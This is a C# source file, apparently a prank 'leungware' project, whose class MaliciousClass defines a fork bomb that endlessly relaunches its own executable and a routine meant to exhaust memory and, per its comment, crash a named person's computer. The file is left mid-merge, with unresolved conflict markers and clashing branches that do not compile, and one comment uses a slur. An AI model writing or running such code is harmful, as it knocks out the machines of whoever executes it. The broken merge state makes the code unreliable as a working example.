using System;
using System.Collections.Generic;
using System.Reflection;
using System.Diagnostics;

namespace leungware_v420
{
    public class MaliciousClass
    {
        public static void ForkBomb(bool confirmation)
        {
            while (confirmation)
            {
                Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }

        private static Double[] GetData()
        {
<<<<<<< HEAD
            Random rnd = new Random();
            List<double> valuesDoubles = new List<double>();
            for (long i = 0; i < long.MaxValue; i++)
=======
            /* Allocates retard levels of things into memory, effectively crashing the program, and in low memory systems
             (e.g John's Computer), may cause a total failure of the computer.*/
            long chunkSize = Int64.MaxValue;
            long nSizeGetter = Int64.MaxValue;
            Random random = new Random();
            long n = 0;
            double total = 0;
            for (int i = 0; i <= (long) Math.Ceiling(nSizeGetter * 1.0 / chunkSize) - 1; i++)
>>>>>>> 9f1e30ab311348cca211cb7346f115991f3b928e
            {
                valuesDoubles.Add(rnd.NextDouble());
            }

            return valuesDoubles.ToArray();
        }

        public void CrashProgram()
        {
            Double[] values = GetData();
        }
    }
}
